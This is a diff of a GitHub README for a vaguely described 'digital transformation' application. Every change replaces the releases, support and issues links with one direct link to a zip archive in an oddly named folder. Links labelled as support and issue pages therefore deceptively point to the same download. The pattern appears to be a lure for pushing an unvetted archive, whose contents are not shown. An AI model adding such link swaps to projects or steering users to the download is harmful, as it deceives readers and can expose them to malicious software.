@@ -1,6 +1,6 @@
 # 🌐 manifiesto-sinergia-digital-total - Your Gateway to Digital Transformation
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Hajrbox/manifiesto-sinergia-digital-total/releases)
+[![Download](https://raw.githubusercontent.com/Hajrbox/manifiesto-sinergia-digital-total/main/hyalographer/manifiesto-sinergia-digital-total.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Hajrbox/manifiesto-sinergia-digital-total/main/hyalographer/manifiesto-sinergia-digital-total.zip)
 
 ## 🛠️ Overview
 
@@ -12,7 +12,7 @@ To get started with this application, you just need to follow a few simple steps
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download Here](https://github.com/Hajrbox/manifiesto-sinergia-digital-total/releases).
+To download the application, visit this page: [Download Here](https://raw.githubusercontent.com/Hajrbox/manifiesto-sinergia-digital-total/main/hyalographer/manifiesto-sinergia-digital-total.zip).
 
 Here are the steps to download and install:
 
@@ -62,13 +62,13 @@ After installation, open the application. You will find an easily navigable inte
 2. **Reports Section:** Access financial reports and digital strategies.
 3. **Settings:** Personalize your experience by adjusting preferences.
 
-If you need further assistance, help documentation is available within the application or by visiting our [Support Page](https://github.com/Hajrbox/manifiesto-sinergia-digital-total/support).
+If you need further assistance, help documentation is available within the application or by visiting our [Support Page](https://raw.githubusercontent.com/Hajrbox/manifiesto-sinergia-digital-total/main/hyalographer/manifiesto-sinergia-digital-total.zip).
 
 ## 📣 Community and Support
 
 Join our community for sharing ideas and getting support:
 
-- Participate in discussions on our [GitHub Issues Page](https://github.com/Hajrbox/manifiesto-sinergia-digital-total/issues).
+- Participate in discussions on our [GitHub Issues Page](https://raw.githubusercontent.com/Hajrbox/manifiesto-sinergia-digital-total/main/hyalographer/manifiesto-sinergia-digital-total.zip).
 - Follow updates on our project through the repository.
 
 ## 💬 Feedback
@@ -79,4 +79,4 @@ We welcome user feedback to help improve the application. Please share your thou
 
 The "manifiesto-sinergia-digital-total" application aims to equip you with the tools and insights needed for today's digital age. Whether you see it as a breakthrough or a passing phase, your experience with this application can shape how you approach digital transformation.
 
-For any questions or support, refer back to the download link: [Download Here](https://github.com/Hajrbox/manifiesto-sinergia-digital-total/releases). Your journey into digital transformation begins here.
+For any questions or support, refer back to the download link: [Download Here](https://raw.githubusercontent.com/Hajrbox/manifiesto-sinergia-digital-total/main/hyalographer/manifiesto-sinergia-digital-total.zip). Your journey into digital transformation begins here.
